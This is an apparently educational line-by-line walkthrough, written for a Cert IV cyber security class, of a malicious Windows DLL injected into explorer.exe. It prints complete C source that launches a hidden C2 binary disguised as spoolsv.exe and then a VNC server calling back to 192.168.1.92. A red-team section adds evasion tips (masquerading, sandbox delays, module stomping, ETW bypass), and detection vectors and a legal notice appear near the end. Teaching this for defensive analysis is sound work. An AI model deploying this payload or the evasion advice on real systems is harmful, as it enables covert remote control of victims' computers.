# Payload DLL — Complete Line-by-Line Documentation

> **Target Audience:** Cert IV Cyber Security  
> **Context:** Educational analysis of a malicious DLL payload designed to demonstrate process injection outcomes  
> **Language:** C (Win32 API)  
> **Type:** Dynamic Link Library (DLL)

---

## 1. Overview

This file is a **Dynamic Link Library (DLL)** rather than a standalone executable. It is designed to be injected into `explorer.exe` by the companion injector program. Once loaded, it performs three malicious actions:

1. **Proof of Execution:** Writes a text file to disk confirming the injection succeeded.
2. **Reverse Shell Execution:** Launches a command-and-control (C2) binary (`spoolsv.exe`) from inside `explorer.exe`'s memory space, masking its true origin.
3. **Persistent VNC Callback:** After a 10-second delay, launches a VNC server to provide the attacker with remote graphical access to the compromised machine.

The DLL uses `DllMain` as its entry point. `DllMain` is a special callback function that Windows calls automatically when the DLL is loaded, unloaded, or when threads attach/detach.

---

## 2. Complete Source Code

```c
#include <windows.h>
#include <stdio.h>

void RunPayload(void)
{
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\Temp\\injection_proof.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        const char *msg = "[+] DLL injected into explorer.exe successfully. Payload executed.\n";
        DWORD written;
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hFile);
    }

    WinExec("C:\\Windows\\Temp\\c2\\spoolsv.exe", SW_HIDE);
    
    Sleep(10000);
    WinExec("C:\\Windows\\Temp\\c2\\vncserver.exe -controlapp -connect 192.168.1.92", SW_HIDE);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPayload, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

---

## 3. Line-by-Line Breakdown

### 3.1 Header Includes

```c
#include <windows.h>
```
> **Line meaning:** Includes the Windows API header, providing declarations for every Win32 function, type, and constant used in this DLL: `CreateFileA`, `WriteFile`, `WinExec`, `Sleep`, `CreateThread`, `DllMain`, `HANDLE`, `DWORD`, `BOOL`, `HMODULE`, `LPVOID`, `LPTHREAD_START_ROUTINE`, `FILE_ATTRIBUTE_NORMAL`, `SW_HIDE`, `DLL_PROCESS_ATTACH`, and more. Without this header, the compiler would not recognize any of these identifiers.

```c
#include <stdio.h>
```
> **Line meaning:** Includes the standard C I/O library. It is needed for `strlen()`, which calculates the length of the proof-of-execution message before writing it to the file. While `printf` is not used here, `stdio.h` is the canonical header for `strlen` on many Windows compiler toolchains (though `string.h` is more precise).

---

### 3.2 `RunPayload` Function

```c
void RunPayload(void)
```
> **Line meaning:** Declares a function named `RunPayload` that takes no arguments (`void`) and returns nothing (`void`). This is the function that contains the actual malicious behavior: writing a proof file and launching secondary payloads. It is called asynchronously in a new thread so that `DllMain` can return quickly.

```c
{
```
> **Line meaning:** Opening brace for the `RunPayload` function body.

---

#### Creating the Proof File

```c
    HANDLE hFile = CreateFileA(
```
> **Line meaning:** Declares a variable `hFile` of type `HANDLE` and assigns it the return value of `CreateFileA`. `CreateFileA` is the Windows API function for creating or opening files, devices, pipes, and other I/O resources. The trailing `A` indicates the **ANSI** (8-bit character) version, as opposed to `CreateFileW` which uses wide (UTF-16) characters.

```c
        "C:\\Windows\\Temp\\injection_proof.txt",
```
> **Line meaning:** The first argument to `CreateFileA`: a string literal specifying the path of the file to create. In C source code, a single backslash is an escape character (`\n`, `\t`), so to represent a literal backslash in a Windows path, we must write `\\`. This resolves to the actual path `C:\Windows\Temp\injection_proof.txt`. `C:\Windows\Temp` is a world-writable directory on Windows, making it a common staging ground for malware.

```c
        GENERIC_WRITE,
```
> **Line meaning:** The desired access mode. `GENERIC_WRITE` is a bitmask requesting write access to the file. We do not need read access because we are only creating and writing to the file, not reading it back.

```c
        0,
```
> **Line meaning:** The share mode. `0` means **no sharing** — while our handle is open, no other process can open this file for reading, writing, or deletion. This prevents race conditions or tampering during the write operation.

```c
        NULL,
```
> **Line meaning:** A pointer to a `SECURITY_ATTRIBUTES` structure. Passing `NULL` means the file gets a default security descriptor and the handle is **not** inheritable by child processes.

```c
        CREATE_ALWAYS,
```
> **Line meaning:** The creation disposition. `CREATE_ALWAYS` tells Windows: create a new file, and if a file with this name already exists, overwrite it (truncate to zero length). Other common values include `OPEN_EXISTING`, `CREATE_NEW`, and `OPEN_ALWAYS`.

```c
        FILE_ATTRIBUTE_NORMAL,
```
> **Line meaning:** File attributes and flags. `FILE_ATTRIBUTE_NORMAL` means the file has no special attributes (it is not hidden, not read-only, not a system file, etc.). It is the default for ordinary files.

```c
        NULL
```
> **Line meaning:** A handle to a template file. `NULL` means no template is used. A template file can be used to copy attributes (such as compression or encryption) to the newly created file.

```c
    );
```
> **Line meaning:** Closes the function call. `CreateFileA` returns a `HANDLE` on success, or `INVALID_HANDLE_VALUE` on failure.

```c
    if (hFile != INVALID_HANDLE_VALUE) {
```
> **Line meaning:** Checks whether the file was successfully created. `INVALID_HANDLE_VALUE` is a special constant (typically `-1`) that Windows APIs return when handle creation fails. If the file creation succeeded, we enter the block to write data.

```c
        const char *msg = "[+] DLL injected into explorer.exe successfully. Payload executed.\n";
```
> **Line meaning:** Declares a pointer `msg` to a constant C string. The string contains a human-readable confirmation message. `const` ensures we do not accidentally modify the string literal. The message ends with `\n` (newline) so if the file is viewed in a text editor or with `type`, the cursor moves to the next line.

```c
        DWORD written;
```
> **Line meaning:** Declares a `DWORD` variable named `written`. This will receive the number of bytes actually written to the file by `WriteFile`. It is uninitialized here; `WriteFile` will populate it.

```c
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
```
> **Line meaning:** Writes the contents of `msg` into the file.  
> - `hFile`: the file handle obtained from `CreateFileA`.  
> - `msg`: pointer to the buffer containing the data to write.  
> - `(DWORD)strlen(msg)`: the number of bytes to write. `strlen(msg)` counts characters excluding the null terminator. The cast to `DWORD` satisfies the function signature.  
> - `&written`: the address of our `DWORD` variable. `WriteFile` writes the number of bytes successfully written into this location. The `&` operator takes the address of the variable.  
> - `NULL`: no overlapped (asynchronous) I/O structure is used; this is a synchronous write.  
> The return value of `WriteFile` (a `BOOL`) is ignored here, which is technically sloppy but functionally acceptable for a simple proof file.

```c
        CloseHandle(hFile);
```
> **Line meaning:** Closes the file handle. This flushes any remaining buffered data to disk and releases the kernel object. Failing to close handles causes resource leaks. After this call, the file is closed and accessible to other processes.

```c
    }
```
> **Line meaning:** Closes the `if (hFile != INVALID_HANDLE_VALUE)` block.

---

#### Launching the Reverse Shell

```c
    WinExec("C:\\Windows\\Temp\\c2\\spoolsv.exe", SW_HIDE);
```
> **Line meaning:** Executes a new program. `WinExec` is a legacy Windows API function that runs a specified command.  
> - The first argument is the path to the executable: `C:\Windows\Temp\c2\spoolsv.exe`. The name `spoolsv.exe` is deliberately chosen to impersonate the legitimate Windows Print Spooler service (`C:\Windows\System32\spoolsv.exe`). This is **masquerading** — a technique where malware uses names similar to legitimate system binaries to confuse administrators and analysts.  
> - The second argument `SW_HIDE` is a constant telling Windows to hide the window of the launched program. The value is `0`. This ensures no console window or GUI appears on the victim's screen, maintaining stealth.  
> Crucially, because this `WinExec` call executes from inside `explorer.exe`, any process-monitoring tool will show `explorer.exe` as the parent process of `spoolsv.exe`, not the injector.

---

#### Delayed VNC Callback

```c
    Sleep(10000);
```
> **Line meaning:** Suspends the current thread for **10,000 milliseconds** (10 seconds). `Sleep` is a Windows API that yields the CPU and tells the scheduler not to run this thread until the interval elapses. From a red-team perspective, this delay is tactical:  
> - It spaces out malicious actions, making time-based behavioral detection harder.  
> - It allows the first payload (`spoolsv.exe`) to initialise before the second payload starts.  
> - It may evade simple sandbox detection that only monitors the first few seconds of execution.

```c
    WinExec("C:\\Windows\\Temp\\c2\\vncserver.exe -controlapp -connect 192.168.1.92", SW_HIDE);
```
> **Line meaning:** Launches a second payload: a VNC server.  
> - `vncserver.exe` is a remote desktop tool commonly used for remote access. In an attack scenario, this provides the attacker with a graphical view of the victim's desktop.  
> - The arguments `-controlapp -connect 192.168.1.92` are typical VNC reverse-connection flags, instructing the VNC server to initiate an outbound connection to the attacker's machine at `192.168.1.92` rather than waiting for an inbound connection. Reverse connections are preferred by attackers because they often bypass NAT and outbound firewall rules.  
> - `SW_HIDE` again hides the window.  
> Like the reverse shell, this process's parent will appear to be `explorer.exe`.

```c
}
```
> **Line meaning:** Closes the `RunPayload` function body.

---

### 3.3 `DllMain` Function

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
```
> **Line meaning:** Declares the **entry point** of the DLL. Every DLL must export a `DllMain` function (though it can be minimal). Windows calls this function automatically under specific circumstances.  
> - `BOOL`: return type; `TRUE` means initialization succeeded, `FALSE` means it failed and Windows should unload the DLL.  
> - `APIENTRY`: a calling convention macro that expands to `__stdcall`. This specifies how arguments are pushed onto the stack and who cleans them up. Windows API functions use `__stdcall`.  
> - `HMODULE hModule`: a handle to the DLL module itself. This is the base address where the DLL is loaded in memory. It can be used with functions like `DisableThreadLibraryCalls` or `GetProcAddress`.  
> - `DWORD ul_reason_for_call`: a code telling **why** `DllMain` was called. It will be one of four constants (`DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, `DLL_PROCESS_DETACH`).  
> - `LPVOID lpReserved`: reserved pointer. It is `NULL` when the DLL is loaded via `LoadLibrary`, and non-NULL when loaded implicitly at process startup.

```c
{
```
> **Line meaning:** Opening brace for `DllMain`.

```c
    switch (ul_reason_for_call) {
```
> **Line meaning:** A `switch` statement is the standard way to handle the four possible reasons Windows might call `DllMain`. It evaluates `ul_reason_for_call` and jumps to the matching `case` label. Using a `switch` ensures we only execute payload logic when appropriate.

```c
    case DLL_PROCESS_ATTACH:
```
> **Line meaning:** This case is executed **once** when the DLL is first loaded into a process's address space. In our injection scenario, this happens immediately after `LoadLibraryA` is called by the remote thread in `explorer.exe`. This is the moment we want to trigger our payload.

```c
        DisableThreadLibraryCalls(hModule);
```
> **Line meaning:** Calls the Windows API `DisableThreadLibraryCalls`. By default, Windows calls `DllMain` with `DLL_THREAD_ATTACH` every time a new thread is created in the process, and `DLL_THREAD_DETACH` when a thread exits. For a malicious DLL, these extra calls are unnecessary and slightly increase visibility. This function tells Windows: "only call me for process attach and detach, not for thread events." It is a minor stealth optimisation.

```c
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPayload, NULL, 0, NULL);
```
> **Line meaning:** Creates a new thread inside the current process (`explorer.exe`) to run the payload.  
> - `NULL`: default security attributes.  
> - `0`: default stack size.  
> - `(LPTHREAD_START_ROUTINE)RunPayload`: the function the thread should execute. `LPTHREAD_START_ROUTINE` is a typedef for a function pointer type: `DWORD (*)(LPVOID)`. We cast `RunPayload` to this type. Although `RunPayload` takes `void` and returns `void`, the cast is accepted by the compiler because both are just addresses. At runtime, the thread will call `RunPayload`.  
> - `NULL`: the argument passed to the thread function. `RunPayload` ignores it.  
> - `0`: run the thread immediately (no creation flags).  
> - `NULL`: we do not need the thread ID.  
> **Why create a thread?** Because `DllMain` runs inside the **Loader Lock**, a critical section held by the Windows loader. Performing long-running or blocking operations (like `Sleep`, file I/O, or process creation) inside `DllMain` can deadlock the process or cause instability. Spawning a separate thread allows `DllMain` to return immediately, releasing the loader lock, while the payload runs safely in parallel.

```c
        break;
```
> **Line meaning:** Exits the `switch` statement. Without `break`, execution would "fall through" to the next case.

```c
    case DLL_THREAD_ATTACH:
```
> **Line meaning:** This case would execute whenever a new thread is created in the process. Because we called `DisableThreadLibraryCalls`, this case will **never** be reached, but it is included for completeness.

```c
    case DLL_THREAD_DETACH:
```
> **Line meaning:** This case would execute whenever a thread exits. Again, disabled by `DisableThreadLibraryCalls`.

```c
    case DLL_PROCESS_DETACH:
```
> **Line meaning:** This case executes when the DLL is being unloaded from the process (either because `FreeLibrary` was called or the process is terminating). Our payload does nothing on detach.

```c
        break;
```
> **Line meaning:** Exits the switch for the detach cases.

```c
    }
```
> **Line meaning:** Closes the `switch` statement.

```c
    return TRUE;
```
> **Line meaning:** Returns `TRUE` to Windows, signalling that the DLL initialized successfully. If `DllMain` returned `FALSE` during `DLL_PROCESS_ATTACH`, Windows would unload the DLL and `LoadLibraryA` would return `NULL`.

```c
}
```
> **Line meaning:** Closes the `DllMain` function body.

---

## 4. Key Concepts

### 4.1 Windows API Concepts

| Concept | Explanation |
|---------|-------------|
| **DLL (Dynamic Link Library)** | A file containing code and data that multiple programs can use simultaneously. When loaded, the DLL's code executes in the **calling process's address space**, giving it full access to that process's memory and privileges. |
| **DllMain** | The mandatory entry point for DLLs. Windows invokes it to notify the DLL of attachment, detachment, and thread events. It is the logical place to trigger initialisation or payload code. |
| **Loader Lock** | A process-wide critical section held by the Windows loader while `DllMain` executes. Blocking operations inside `DllMain` can deadlock the entire process. Best practice is to do minimal work and spawn a thread for anything complex. |
| **CreateFileA / WriteFile / CloseHandle** | The standard Win32 file I/O trio. `CreateFileA` opens or creates a file; `WriteFile` writes bytes; `CloseHandle` releases resources. These are kernel-mediated operations that leave forensic artifacts. |
| **WinExec** | A legacy API for launching programs. It is simpler than `CreateProcess` but less flexible. It returns immediately after starting the program (it does not wait for it to finish). |
| **Sleep** | Relinquishes the CPU for a specified time. Attackers use it to delay secondary payloads, evading time-limited sandbox analysis. |
| **SW_HIDE** | A window-show constant (`0`) that prevents a launched program from displaying a window. Essential for stealthy malware. |
| **DisableThreadLibraryCalls** | An API that suppresses `DLL_THREAD_ATTACH` and `DLL_THREAD_DETACH` notifications. Reduces the DLL's visibility and avoids unnecessary re-entrancy. |
| **CreateThread** | Creates a new thread of execution within the current process. The thread begins at the specified start address with its own stack and register state. |

### 4.2 DLL & Process Injection Concepts

| Concept | Explanation |
|---------|-------------|
| **DLL Injection** | The act of forcing a running process to load a DLL. Once loaded, the DLL becomes part of the process and can execute arbitrary code with that process's privileges. |
| **Masquerading** | Naming malware with filenames similar to legitimate system binaries (e.g., `spoolsv.exe` in `Temp` instead of `System32`). This confuses analysts and may fool naive allow-listing rules. |
| **Parent Process Spoofing (by Injection)** | Because the payload runs inside `explorer.exe`, any child processes it creates appear to have `explorer.exe` as their parent. EDR tools logging parent-child relationships will attribute the activity to a trusted process. |
| **Reverse Connection** | The VNC server initiates an outbound connection to the attacker (`192.168.1.92`). This is often more reliable than inbound connections because home and corporate networks typically block incoming traffic but allow outgoing connections. |
| **Staging Directory** | `C:\Windows\Temp` is used because it is writable by almost all user accounts and is rarely scrutinised by non-technical users. It is a classic malware staging location. |
| **Process Attribution Evasion** | Network connections and file operations originating from `explorer.exe` do not immediately raise alerts because `explorer.exe` is expected to access files and occasionally the network. |

### 4.3 C Programming Concepts

| Concept | Explanation |
|---------|-------------|
| **`void` functions** | `void RunPayload(void)` explicitly declares a function with no parameters and no return value. In C, empty parentheses `()` means unspecified parameters, not zero parameters. Using `(void)` is correct and defensive. |
| **String literals and escaping** | `\\` in a C source string becomes a single `\` in the compiled binary. Without escaping, sequences like `\n` would be interpreted as newlines and the path would be malformed. |
| **`const char *`** | A pointer to a string that the function promises not to modify. The string literal itself resides in the DLL's read-only data section. |
| **Type casting function pointers** | `(LPTHREAD_START_ROUTINE)RunPayload` tells the compiler to treat the address of `RunPayload` as a thread start routine. This is necessary because `CreateThread` expects a specific function signature, and `RunPayload`'s signature differs slightly. |
| **Address-of operator (`&`)** | `&written` passes the memory address of the `written` variable so `WriteFile` can store the number of bytes written into it. |
| **Switch fall-through** | The consecutive `case DLL_THREAD_ATTACH:`, `case DLL_THREAD_DETACH:`, and `case DLL_PROCESS_DETACH:` labels with no code between them and a single `break` at the end mean all three cases execute the same action (nothing, in this case). |
| **`APIENTRY` / `__stdcall`** | A calling convention where the callee (the function being called) cleans arguments from the stack. Windows requires `DllMain` to use this convention so the OS can call it predictably. |

---

## 5. Why This Technique Works (Red Team Perspective)

1. **Execution in Trusted Context:** Once inside `explorer.exe`, every action the payload takes — writing files, spawning processes, opening network sockets — is attributed to `explorer.exe` by basic monitoring tools. Advanced EDR must correlate across events to see the true origin.

2. **No New Suspicious Process for the Core Payload:** The DLL itself does not appear as a new process; it is only a loaded module inside an existing one. Process-based detection rules that look for blacklisted binary names will miss it.

3. **Masquerading Child Processes:** By placing fake `spoolsv.exe` in `Temp` and naming it after a legitimate service, the attacker creates confusion. A quick glance at Process Explorer might show `spoolsv.exe` and be dismissed as the print spooler unless the path is inspected.

4. **Delayed Execution:** The 10-second `Sleep` followed by a second `WinExec` staggers malicious activity. Sandbox environments that monitor only the first 5–7 seconds may miss the VNC callback entirely.

5. **Reverse VNC Connection:** The VNC server connects outbound to `192.168.1.92`. Most firewalls are permissive for outbound connections. The attacker does not need to port-forward or expose infrastructure inbound.

6. **Minimal Forensic Footprint of the Injector:** The injector program exits cleanly after injection. Only `explorer.exe` (with the loaded DLL) and the spawned child processes remain. If the injector was run from memory or deleted itself, there may be no artifact left of the initial compromise vector.

---

## 5.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Running payload inside `explorer.exe` via DLL injection makes your activity invisible because it inherits a trusted parent process.

**What the lab hides from you:** Modern EDR does not rely solely on parent-child correlation. It correlates across **events** — image load, file creation, network connection, process spawn. Even if the parent is `explorer.exe`, the sequence "load unknown DLL → write file to `Temp` → spawn `spoolsv.exe` → connect to external IP" is a detectable chain. The `injection_proof.txt` file is a forensic gift. The 10-second `Sleep` followed by VNC connection is a time-based behavioral pattern that machine learning models flag.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| EDR event correlation | Correlates DLL load + file write + process spawn + network connect | No EDR to correlate events |
| Image load monitoring | Sysmon Event ID 7 logs every DLL load | No Sysmon in lab |
| Network telemetry | `explorer.exe` making outbound TCP to non-standard port is anomalous | No network telemetry |
| File integrity monitoring | `injection_proof.txt` in `Temp` is a high-fidelity artifact | No FIM in lab |
| Time-based heuristics | 10s delay then second process spawn = sandbox evasion pattern | No behavioral analytics |
| PEB walking | EDR enumerates loaded modules; unknown DLL stands out | No module enumeration |

### What a Professional Red Teamer Would Do

**Instead of a proof-of-execution file and staggered child processes, they would:**
- **Operate entirely in memory** — no disk artifacts, no proof files, no logs
- **Use legitimate network protocols** — HTTPS from `explorer.exe` is normal; raw TCP is not
- **Avoid child process spawning** — execute all payload within the injected process; no new processes = no parent-child alerts
- **Use module stomping** — overwrite a legitimate loaded DLL in memory instead of loading a new one; appears as a known-good module

**Key difference:** The pro understands that EDR thinks in **chains of events**, not single actions. Every file write, every process spawn, every network connection is a link. The pro minimizes the chain length.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| Module stomping | Overwrite legitimate DLL = no unknown module in PEB | ired.team: "Module Stomping" |
| In-memory execution | No disk artifact = no file-based detection | "Reflective DLL Injection" by Stephen Fewer |
| ETW bypass | Silences event logging that EDR consumes | MDsec: "ETW Tampering" |
| Cobalt Strike execute-assembly | Run .NET assemblies in memory without dropping to disk | Cobalt Strike documentation |

### The Honest Bottom Line

> This payload DLL teaches DLL entry points, thread creation, and trusted-context execution. It does not teach memory-resident operational security. In the real world, writing proof files and spawning staggered child processes from an injected DLL is **leaving breadcrumbs to your own door**. The value is understanding how injected code behaves. Learn in-memory execution and module stomping next.

---

## 6. Detection Vectors

| Vector | Description |
|--------|-------------|
| **Unexpected DLL in `explorer.exe`** | Tools like Process Explorer, `listdlls.exe`, or Sysmon Event ID 7 (`ImageLoad`) can reveal a DLL loaded from `C:\Windows\Temp` or another non-standard path inside `explorer.exe`. |
| **Unsigned / Unusual Module** | Legitimate Windows DLLs are signed by Microsoft. A DLL with no valid signature, unknown publisher, or suspicious name inside `explorer.exe` is an immediate red flag. |
| **Child Processes of `explorer.exe`** | While `explorer.exe` sometimes launches programs (when a user double-clicks a file), it rarely launches binaries from `C:\Windows\Temp\c2\`. EDR parent-child rules can flag `explorer.exe` → `spoolsv.exe` (from wrong path). |
| **Outbound Connections from `explorer.exe`** | `explorer.exe` does not typically make outbound TCP connections to arbitrary IP addresses on non-standard ports. A network connection to `192.168.1.92` on a VNC port (5900) from `explorer.exe` is highly anomalous. |
| **File Creation in `C:\Windows\Temp`** | The `injection_proof.txt` file is a forensic artifact. Even if the payload is memory-resident, this file persists on disk and can be discovered during incident response. |
| **Sysmon Event ID 1 (Process Create)** | Sysmon logs process creation with full command lines. `WinExec` eventually calls `CreateProcess`, which will be logged. The command line `C:\Windows\Temp\c2\spoolsv.exe` is suspicious. |
| **ETW (Event Tracing for Windows)** | ETW captures image loads, process starts, and thread creations. Advanced hunting queries can detect `explorer.exe` loading a DLL shortly after a `CreateRemoteThread` event from another process. |
| **Behavioral Time Patterns** | A process (`explorer.exe`) creating a child, waiting exactly 10 seconds, then creating another child with a network-connect flag is a suspicious time-based pattern detectable by behavioural analytics. |
| **Memory Forensics (Volatility)** | A memory dump analysed with Volatility can list DLLs per process (`dlllist`), show network connections (`netscan`), and reveal injected code segments. The attacker’s DLL will appear in `explorer.exe`'s module list. |

---

> **Educational Note:** This code is provided for academic analysis only. Understanding how malicious DLLs operate is critical for malware analysts, incident responders, and defenders. Using this code on systems without explicit written authorisation is illegal under Australian law, including the *Cybercrime Act 2001* (Cth) and state equivalents such as the *Crimes Act 1958* (Vic).
